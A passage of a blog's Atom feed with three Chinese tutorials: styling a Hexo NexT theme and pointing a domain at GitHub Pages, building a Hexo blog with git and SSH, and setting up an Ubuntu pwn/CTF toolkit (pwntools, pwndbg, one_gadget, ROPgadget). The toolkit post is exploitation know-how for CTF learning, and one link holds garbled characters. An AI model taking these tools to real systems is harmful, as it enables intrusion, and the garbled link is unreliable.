calendar-check-o12345678</span><br></pre></td></tr></table></figure><h5 id="3-2-修改文章内链接文本样式"><a href="#3-2-修改文章内链接文本样式" class="headerlink" title="3.2 修改文章内链接文本样式"></a><strong>3.2 修改文章内链接文本样式</strong></h5><p>将链接文本设置为蓝色，鼠标划过时文字颜色加深，并显示下划线。<br>修改文件themes\next\source\css_common\components\post\post.styl，添加如下css样式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #0477ab;</span><br><span class="line">    text-decoration: underline;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;12345678</span><br></pre></td></tr></table></figure><p>选择.post-body是为了不影响标题，选择p是为了不影响首页“阅读全文”的显示样式。</p><h5 id="3-3在主题配置文件中添加字段"><a href="#3-3在主题配置文件中添加字段" class="headerlink" title="3.3在主题配置文件中添加字段"></a><strong>3.3在主题配置文件中添加字段</strong></h5><p>在主题配置文件 _config.yml中添加以下字段开启此功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 文章末尾添加“本文结束”标记</span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure><h5 id="3-4生成sitemap"><a href="#3-4生成sitemap" class="headerlink" title="3.4生成sitemap"></a><strong>3.4生成sitemap</strong></h5><p>Sitemap用于通知搜索引擎网站上有哪些可供抓取的网页，以便搜索引擎可以更加智能地抓取网站。<br>执行以下命令，安装插件hexo-generator-sitemap，用于生成sitemap：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-generator-sitemap --save1</span><br></pre></td></tr></table></figure><p>在站点配置文件 _config.yml中添加如下字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sitemap:</span><br><span class="line">path: sitemap.xml12</span><br></pre></td></tr></table></figure><p>执行hexo g，就会在网站根目录生成 sitemap.xml 。</p><h4 id="四-修改github域名"><a href="#四-修改github域名" class="headerlink" title="四.修改github域名"></a><strong>四.修改github域名</strong></h4><h5 id="4-1域名解析到github"><a href="#4-1域名解析到github" class="headerlink" title="4.1域名解析到github"></a>4.1域名解析到github</h5><p>（1）先添加一个CNAME记录类型，主机记录写@，后面记录值写上你的<a href="http://xxxx.github.io/">http://xxxx.github.io</a><br>（2）再添加一个CNAME记录类型，主机记录写www，后面记录值也是<a href="http://xxxx.github.io/">http://xxxx.github.io</a></p><p>这样别人用www和不用www都能访问你的网站（其实www的方式，会先解析成<a href="http://xxxx.github.爫io,c炤睾na腭me惡htt悤p帅//xxx.com%EF%BC%8C%E5%8D%B3%E4%B8%AD%E9%97%B4%E6%98%AF%E7%BB%8F%E8%BF%87%E4%B8%80%E6%AC%A1%E8%BD%AC%E6%8D%A2%E7%9A%84%EF%BC%89">http://xxxx.github.io，然后根据CNAME再变成http://xxx.com，即中间是经过一次转换的）</a></p><p>也可以使用A记录，A记录是直接解析到空间的ip地址。</p><p>CNAME是解析到别名。</p><h5 id="4-2ping域名"><a href="#4-2ping域名" class="headerlink" title="4.2ping域名"></a>4.2ping域名</h5><p>ping是对网络目标进行检测的基本命令工具。</p><p>但域名和IP并不是一一对应的关系</p><p>ping域名，可以得到一个IP为目标</p><p>但是ping ip 得到的是整个服务器 并不是某一个域名<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDJDIDADFCPDDDIDGCOHAGOGH" alt="img"></p><p>直接ping域名没有成功，ping www.+域名成功了。</p><p>判断域名有没有解析成功，在DOS系统界面里输入ping+空格+网址。</p><p>可以看到目标解析IP地址和相应的网址响应时间，即说明解析成功。</p><h5 id="4-3github修改文件"><a href="#4-3github修改文件" class="headerlink" title="4.3github修改文件"></a>4.3github修改文件</h5><p>修改CNAME文件</p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDJDIDADGCPDDDIDICOHAGOGH" alt="img"></p><p>再修改custom domain为自己的域名</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​                                                                       &lt;/p&gt;
&lt;h4 id=&quot;一-使用nexT主题&quot;&gt;&lt;a href=&quot;#一-使用nexT主题&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>搭建博客</title>
    <link href="https://dh15219984801.store/2020/10/09/blog/title%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>https://dh15219984801.store/2020/10/09/blog/title%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2020-10-08T16:24:13.474Z</published>
    <updated>2020-10-17T15:33:31.726Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一，github注册"><a href="#一，github注册" class="headerlink" title="一，github注册"></a>一，github注册</h4><p><strong>使用github来托管项目文件</strong></p><p><strong>仓库：即你的项目，你想在github上开源一个项目，就必须要新建一个Repository。</strong></p><p><strong>创建项目</strong>    项目名：用户名.github.io</p><p>搭建步骤：创建个人站点–新建仓库（注:仓库名必须是【用户名.github.io】）</p><p><strong>个人站点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;用户名.github.io</span><br></pre></td></tr></table></figure><h4 id="二，安装node"><a href="#二，安装node" class="headerlink" title="二，安装node"></a>二，安装node</h4><p>打开node官网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;nodejs.org&#x2F;en&#x2F;</span><br></pre></td></tr></table></figure><p>下载安装，点击Add to PATH选项，添加到环境变量</p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDJDICPDDDHDFCOHAGOGH"></p><p>则安装完成。</p><p>安装完node后，就可以使用npm命令安装Hexo，输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><h4 id="三，安装git"><a href="#三，安装git" class="headerlink" title="三，安装git"></a>三，安装git</h4><p><strong>通过git管理github托管项目代码</strong></p><p><strong>git是一个免费，开源的版本控制软件。</strong></p><h4 id="1，git基本工作流程"><a href="#1，git基本工作流程" class="headerlink" title="1，git基本工作流程"></a>1，git基本工作流程</h4><p>2.1，工作区（Working Directory） 添加，编辑，修改文件等</p><p>2.2，暂存区  暂存已经修改的文件最后统一提交到git仓库中</p><p>2.3，Git Repository（Git 仓库） 最终确定的文件保存到仓库，成为一个新的版本，并且对他人可见</p><p>a.  查看工作区和暂存区的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p>b. 把工作区的内容添加到暂存区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add 文件名</span><br></pre></td></tr></table></figure><p>c. 将暂存区的文件提交到仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;提交描述&quot;</span><br></pre></td></tr></table></figure><h4 id="2，实战演练"><a href="#2，实战演练" class="headerlink" title="2，实战演练"></a>2，实战演练</h4><p><strong>a，在文件目录下创建文件夹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir 文件名</span><br></pre></td></tr></table></figure><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDJDHCPDDDGDFCOHAGOGH"></p><p><strong>b，在文件内初始化git（创建git仓库）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd test</span><br><span class="line">git init</span><br></pre></td></tr></table></figure><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDJDJCPDDDGDGCOHAGOGH"></p><p><strong>c，向仓库添加文件</strong></p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDADACPDDDGDICOHAGOGHhttp://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDADBCPDDDGDJCOHAGOGH"></p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDADBCPDDDGDJCOHAGOGH"></p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDADCCPDDDHDACOHAGOGH"></p><h4 id="3，删除文件"><a href="#3，删除文件" class="headerlink" title="3，删除文件"></a>3，删除文件</h4><p><strong>a，删除工作区文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf 1.php</span><br></pre></td></tr></table></figure><p><strong>b，删除暂存区文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm 1.php</span><br></pre></td></tr></table></figure><p><strong>c，提交操作</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &#39;提交描述&#39;</span><br></pre></td></tr></table></figure><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDADDCPDDDHDECOHAGOGH"></p><h4 id="4，Git初始化及仓库创建和操作"><a href="#4，Git初始化及仓库创建和操作" class="headerlink" title="4，Git初始化及仓库创建和操作"></a>4，Git初始化及仓库创建和操作</h4><p>设置用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &#39;用户名&#39;</span><br></pre></td></tr></table></figure><p>设置用户名邮箱</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email &#39;用户邮箱&#39;</span><br></pre></td></tr></table></figure><p>查看设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config -list</span><br></pre></td></tr></table></figure><h4 id="5，Git管理远程仓库"><a href="#5，Git管理远程仓库" class="headerlink" title="5，Git管理远程仓库"></a>5，Git管理远程仓库</h4><p><strong>a，使用远程仓库的目的</strong></p><p>作用:备份，实现代码共享集中化管理</p><p><strong>b，将本地仓库同步到git远程仓库中</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure><p><strong>4，git克隆操作</strong></p><p>目的：将远程仓库（对应的项目）复制到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone 仓库地址</span><br></pre></td></tr></table></figure><h4 id="四，githubSSH配置"><a href="#四，githubSSH配置" class="headerlink" title="四，githubSSH配置"></a>四，githubSSH配置</h4><p>GitHub配置SSH Key的目的是为了帮助我们在通过git提交代码时，不需要繁琐的验证过程，简化操作流程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;xiangshuo1992&#x2F;preload.git</span><br><span class="line">git@github.com:xiangshuo1992&#x2F;preload.git</span><br></pre></td></tr></table></figure><p>这两个地址展示的是同一个项目，前者是https url 直接有效网址打开，但是用户每次通过git提交的时候都要输入用户名和密码；后者是SSH URL，在通过git提交代码时，不需要验证过程。</p><p><strong>1，检测是否存在SSH KEY</strong></p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDADECPDDDHDHCOHAGOGH"></p><p><strong>如果没有，则需要生成一下</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;Github的注册邮箱&quot;</span><br></pre></td></tr></table></figure><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDADFCPDDDHDICOHAGOGH"></p><h4 id="五，安装Hexo"><a href="#五，安装Hexo" class="headerlink" title="五，安装Hexo"></a>五，安装Hexo</h4><p>Hexo就是我们的个人博客网站的框架。这里需要自己在电脑常里创建一个文件夹，可以命名为Blog，Hexo框架与以后你自己发布的网页都在这个文件夹中。</p><p>在创建的文件夹命令行下，使用npm命令安装Hexo，输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装成功后，需要初始化我们的博客，输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init 博客名</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install #安装npm</span><br><span class="line">hexo s -p 端口号 #本地运行</span><br><span class="line">例：hexo s -p 5555</span><br><span class="line"></span><br><span class="line">或者 hexo s  #会自动给你配置一个端口</span><br></pre></td></tr></table></figure><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDADJCPDDDHDJCOHAGOGH"></p><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDBDECPDDDJDGCOHAGOGH"></p><p><strong>Hexo常用命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g #安装Hexo</span><br><span class="line">npm update hexo -g #升级</span><br><span class="line">hexo init #初始化博客</span><br><span class="line"></span><br><span class="line">命令简写</span><br><span class="line">hexo n &quot;我的博客&quot; &#x3D;&#x3D; hexo new &quot;我的博客&quot; #新建文章</span><br><span class="line">hexo g &#x3D;&#x3D; hexo generate #生成</span><br><span class="line">hexo s &#x3D;&#x3D; hexo server #启动服务预览</span><br><span class="line">hexo d &#x3D;&#x3D; hexo deploy #部署</span><br><span class="line"></span><br><span class="line">hexo server #Hexo会监视文件变动并自动更新，无须重启服务器</span><br><span class="line">hexo server -s #静态模式</span><br><span class="line">hexo server -p 5000 #更改端口</span><br><span class="line">hexo server -i 192.168.1.1 #自定义 IP</span><br><span class="line">hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</span><br></pre></td></tr></table></figure><h4 id="六，发布网站"><a href="#六，发布网站" class="headerlink" title="六，发布网站"></a>六，发布网站</h4><p>上面只是在本地预览，接下来要做的就是就是推送网站，也就是发布网站，让我们的网站可以被更多的人访问。在设置之前，需要解释一个概念，在blog根目录里的_config.yml文件称为<strong>站点</strong>配置文件</p><p>进入跟目录里的themes文件夹，里面也有个_config.yml文件，这个称为<strong>主题</strong>配置文件</p><p>下一步将我们的Hexo与GitHub关联起来，打开站点的配置文件_config.yml，翻到最后修改为：</p><p>deploy:<br>type: git<br>repo: 这里填入你之前在GitHub上创建仓库的完整路径，记得加上 .git<br>branch: master</p><p>如图：<img src="https://i.loli.net/2020/10/17/IFe8WqKrhXcDZUJ.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;一，github注册&quot;&gt;&lt;a href=&quot;#一，github注册&quot; class=&quot;headerlink&quot; title=&quot;一，github注册&quot;&gt;&lt;/a&gt;一，github注册&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;使用github来托管项目文件&lt;/strong&gt;&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Pwn环境搭建</title>
    <link href="https://dh15219984801.store/2020/10/03/pwn/Pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://dh15219984801.store/2020/10/03/pwn/Pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2020-10-03T05:33:06.988Z</published>
    <updated>2020-10-18T04:33:55.461Z</updated>
    
    <content type="html"><![CDATA[<p>​                                                                       </p><h4 id="1-ubuntu16-04设置系统语言为中文"><a href="#1-ubuntu16-04设置系统语言为中文" class="headerlink" title="1.ubuntu16.04设置系统语言为中文"></a>1.ubuntu16.04设置系统语言为中文</h4><p>参考文献：<a href="https://jingyan.baidu.com/article/3aed632ec1d120701180916b.html">https://jingyan.baidu.com/article/3aed632ec1d120701180916b.html</a></p><h4 id="2-更换Ubuntu16-04镜像下载源，推荐阿里源"><a href="#2-更换Ubuntu16-04镜像下载源，推荐阿里源" class="headerlink" title="2.更换Ubuntu16.04镜像下载源，推荐阿里源"></a>2.更换Ubuntu16.04镜像下载源，推荐阿里源</h4><p>首先我们要找到国内的镜像源路径，这里要注意要找ubuntu16.04相对应的，打开链接如图：<a href="https://www.cnblogs.com/hello-/articles/11151038.htm">https://www.cnblogs.com/hello-/articles/11151038.htm</a></p><p><img src="https://i.loli.net/2020/10/15/gPuz9nUkeZVBrFD.png" alt="image-20201015145406067.png"></p><p>接着备份系统自带更新源配置文件，打开终端直接用命令：cp /etc/apt/sources.list /etc/apt/sources.list.backup 进行备份。</p><p>继续配置文件sources.list内容，输入命令：gedit  sources.list 打开文件，把文件内容全部删除，再把更新源路径粘贴进来。粘贴后如下图：<img src="https://i.loli.net/2020/10/15/qjYrBins1DmCQNO.png" alt="1602745093_1_.png"></p><p>保存，退出。</p><p>最后更新源：输入命令：apt  update （也可以用apt-get update，<a href="https://blog.csdn.net/maizousidemao/article/details/79859669">apt与apt-get的区别</a>）。</p><p>开始更新源，结果如图。</p><p><img src="https://i.loli.net/2020/10/18/BVcfMtev9A361aN.png" alt="image.png"></p><h4 id="3-必备环境安装"><a href="#3-必备环境安装" class="headerlink" title="3.必备环境安装"></a>3.必备环境安装</h4><p>安装git ：sudo apt-get install git </p><p>安装VIM ：sudo apt-get install vim</p><p>安装完Git之后一般情况情况下，因为特定原因导致，DNS解析出现问题从而使得Git Clone 速度巨慢。解决办法：</p><p>登录网页<a href="http://www.ipaddress.com/">www.ipaddress.com</a> 查找 <a href="https://links.jianshu.com/go?to=http://github.global-ssl.fastly.net/">github.glo        t</a> 和<a href="https://links.jianshu.com/go?to=http://github.com/">github.com </a>域名对应地址：</p><p><img src="https://i.loli.net/2020/10/16/Ff7bySNPGLhn38p.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/10/16/fd6htvrcGemRA1T.png" alt="image.png"></p><p>更改DNS解析地址 ：sudo gedit /etc/hosts</p><p>在其最后加上所查地址：</p><p>151.101.185.194 <a href="https://links.jianshu.com/go?to=http://github.global-ssl.fastly.net/">github.global.ssl.fastly.net</a></p><p>192.30.253.112  <a href="https://links.jianshu.com/go?to=http://github.com/">github.com</a></p><p>保存退出，重启网卡：sudo /etc/init.d/networking restart</p><h4 id="4-安装pwntools"><a href="#4-安装pwntools" class="headerlink" title="4.安装pwntools"></a>4.安装pwntools</h4><p>参考文献：<a href="https://blog.csdn.net/qq_43613772/article/details/97046215">https://blog.csdn.net/qq_43613772/article/details/97046215</a></p><h5 id="32位依赖库："><a href="#32位依赖库：" class="headerlink" title="32位依赖库："></a>32位依赖库：</h5><p> apt-get install lib32ncurses5</p><p> apt-get install lib32z1</p><h5 id="pwndbg安装"><a href="#pwndbg安装" class="headerlink" title="pwndbg安装"></a><strong>pwndbg安装</strong></h5><p>执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">sudo #.&#x2F;setup.sh</span><br></pre></td></tr></table></figure><h5 id="安装pip："><a href="#安装pip：" class="headerlink" title="安装pip："></a>安装pip：</h5><h6 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h6><p>执行如下指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 1. 更新系统包</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get upgrade</span><br><span class="line"> </span><br><span class="line"># 2. 安装Pip</span><br><span class="line">$ sudo apt-get install python-pip</span><br><span class="line"> </span><br><span class="line"># 3. 检查 pip 是否安装成功</span><br><span class="line">$ pip -V</span><br></pre></td></tr></table></figure><h6 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h6><p>参考文献 ：<a href="https://blog.csdn.net/mrwxh/article/details/79991339?utm_medium=distribute.pc_relevant.none-task-blog-title-8&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/mrwxh/article/details/79991339?utm_medium=distribute.pc_relevant.none-task-blog-title-8&amp;spm=1001.2101.3001.4242</a></p><p>​    01 下载pip：<a href="https://pypi.org/project/pip/#files"> pip-10.0.0.tar</a></p><p>​    02 将pip包上传至linux操作系统中，并解压</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar zxvf pip<span class="number">-10.0</span><span class="number">.0</span>.tar.gz</span><br></pre></td></tr></table></figure><p>​    03 切换到解压出来的pip目录，并且安装pip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd pip<span class="number">-10.0</span><span class="number">.0</span>/</span><br><span class="line"></span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>   <strong>报错：</strong>ImportError: No module named setuptools</p><p>​    解决方案：下载安装<a href="https://pan.baidu.com/s/1SXPexMkBP5RxJmypVXg-Fg">setuptools</a>：</p><p>​    下载：下载<a href="https://pan.baidu.com/s/1SXPexMkBP5RxJmypVXg-Fg">setuptools</a></p><p>​    安装：上传至ubuntu系统的用户目录后解压；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd setuptools<span class="number">-39.0</span><span class="number">.1</span>/</span><br><span class="line">sudo python setup.py install</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure><p>​     04 切换到之前的pip目录安装pip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd pip<span class="number">-10.0</span><span class="number">.0</span>/</span><br><span class="line">sudo python2 setup.py install</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure><p>​    05 检测：Ubuntu 检测是否安装了pip，打开终端 输入  pip3 –version 如图表示成功：</p><p><img src="https://i.loli.net/2020/10/16/2ax9zgHYOEN4Qcw.png" alt="image.png"></p><p>注：链接也可以下载paygame。</p><h4 id="5-安装实用插件"><a href="#5-安装实用插件" class="headerlink" title="5.安装实用插件"></a>5.安装实用插件</h4><p>插件简介：下述三个插件都是python的库</p><p>LibcSearcher用来泄露libc库中函数的偏移的库，</p><p>one_gadget用来寻找libc库中的execve(‘/bin/sh’, NULL, NULL)可以一个gadget就可以getshell</p><p>ROPgadget 做题的工具，用来找gadget的</p><h5 id="LibcSearcher，安装方法："><a href="#LibcSearcher，安装方法：" class="headerlink" title="LibcSearcher，安装方法："></a>LibcSearcher，安装方法：</h5><p>1.git clone <a href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a></p><p>2.cd LibcSearcher</p><p>3.python setup.py install</p><p>4.直接运行python exp.py会提示“No module named LibcSearcher”，需要将LibcSearcher.py 复制到当前目录（安装目录）</p><h5 id="one-gadget安装："><a href="#one-gadget安装：" class="headerlink" title="one_gadget安装："></a>one_gadget安装：</h5><p>sudo apt install ruby</p><p>sudo gem install one_gadget</p><h5 id="ROPgadgets安装与使用："><a href="#ROPgadgets安装与使用：" class="headerlink" title="ROPgadgets安装与使用："></a>ROPgadgets安装与使用：</h5><p>环境：sudo apt install git</p><p>安装命令：</p><p> sudo apt-get install python-capstone</p><p> git clone <a href="https://github.com/JonathanSalwan/ROPgadget.git">https://github.com/JonathanSalwan/ROPgadget.git</a></p><p> cd ROPgadget</p><p> sudo python setup.py install</p><h2 id="二-搭建过程的problem"><a href="#二-搭建过程的problem" class="headerlink" title="二.搭建过程的problem"></a>二.搭建过程的problem</h2><h3 id="1-python升级踩错"><a href="#1-python升级踩错" class="headerlink" title="1.python升级踩错"></a>1.python升级踩错</h3><p>起因，环境搭建过程总是显示python升级，可忽略，但我进行了多余升级的操作如图：</p><p><img src="https://i.loli.net/2020/10/16/tcvCxTauWqn1hRY.png" alt="image.png"></p><p>但是python默认启动python2，而我两个版本都去下载并且升级了python3版本，这并没有什么问题，你只需要在用的时候调用就行。</p><p>但是升级文章最后有python2.7和3.5版本之间随意切换的方法，我又进行了多余的操作，并且切换为原来的版本无效，但是python2和python3的版本均可见</p><p><img src="https://i.loli.net/2020/10/16/2BfqEmP6WR5L1CX.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/10/16/SbqIWZXu3z1QVdJ.png" alt="image.png"></p><p>升级原文链接：<a href="https://blog.csdn.net/jiangyongy/article/details/78902536">https://blog.csdn.net/jiangyongy/article/details/78902536</a></p><h3 id="2-软连接错乱"><a href="#2-软连接错乱" class="headerlink" title="2.软连接错乱"></a>2.软连接错乱</h3><p>切换之后，导致系统pip 和 pip3 的软连接错乱了，装完pip3之后将pip3命令软连接修改为pip，安装了py3 的pwntools。Python2.7和Python3.5的无法和平相处，pip冲突。</p><p><img src="https://i.loli.net/2020/10/16/l9sIFtO3UZxuHiG.png" alt="image.png"></p><p>解决方法：python2 -m pip install numpy，将py2放在pip安装下的最小单位，使用时调用。</p><p>原文链接：<a href="https://blog.csdn.net/franksking/article/details/74025158?utm_medium=distribute.pc_relevant.none-task-blog-title-5&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/franksking/article/details/74025158?utm_medium=distribute.pc_relevant.none-task-blog-title-5&amp;spm=1001.2101.3001.4242</a></p><h5 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h5><p>新建软连接并查看python版本：<a href="https://segmentfault.com/a/1190000021838605">https://segmentfault.com/a/1190000021838605</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​                                                                       &lt;/p&gt;
&lt;h4 id=&quot;1-ubuntu16-04设置系统语言为中文&quot;&gt;&lt;a href=&quot;#1-ubuntu16-04设置系统语</summary>
      
    
    
    
    
  </entry>
  
</feed>
